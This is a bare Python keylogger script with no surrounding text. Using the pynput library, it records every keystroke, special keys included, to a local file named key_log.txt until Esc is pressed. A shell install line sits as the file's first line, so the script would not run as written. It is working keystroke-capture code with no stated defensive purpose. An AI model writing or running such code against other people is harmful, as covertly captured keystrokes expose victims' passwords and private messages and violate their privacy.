pip install pynput
from pynput.keyboard import Listener

# Path to save the log file
log_file_path = "key_log.txt"

# Function to handle key press events
def on_press(key):
    try:
        # Log regular key presses
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Log special keys like space, enter, etc.
        with open(log_file_path, "a") as log_file:
            log_file.write(f" [{key}] ")

# Function to handle key release events
def on_release(key):
    # Stop logging if the Esc key is pressed
    if key == key.esc:
        return False

# Set up listener for key press and release events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

